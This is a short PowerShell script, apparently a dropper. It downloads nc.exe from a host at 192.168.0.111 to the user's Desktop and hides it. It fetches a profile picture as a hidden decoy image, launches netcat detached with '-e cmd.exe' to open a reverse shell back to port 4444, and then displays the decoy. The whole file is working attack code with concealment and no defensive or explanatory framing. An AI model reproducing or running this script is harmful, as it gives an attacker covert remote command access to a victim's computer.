# Define the URL and output path for NC.exe
$url = "192.168.0.111/nc.exe"
$desktopPath = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::Desktop)
$filename = "nc.exe"
$finalPath = Join-Path -Path $desktopPath -ChildPath $filename

# Define the URL and output path for Image File
$url2 = "https://yt3.ggpht.com/2fSOTMAkISZluHbOhkK_Owm7IGLJxCw7uAHYgjG8EHtGTFj7QSJbWe7LyROIU4UAGUy-7Xo_=s176-c-k-c0x00ffffff-no-rj"
$filename2 = "mehedishakeel.jpg"
$finalPath2 = Join-Path -Path $desktopPath -ChildPath $filename2

# Downloading the files
Invoke-WebRequest -Uri $url -OutFile $finalPath
Set-ItemProperty -Path $finalPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)

Invoke-WebRequest -Uri $url2 -OutFile $finalPath2
Set-ItemProperty -Path $finalPath2 -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)


# Define the parameter for the executable
$params = "-d 192.168.0.111 4444 -e cmd.exe"

# Execute the file with parameters
Start-Process -FilePath $finalPath -ArgumentList $params
Start-Process $finalPath2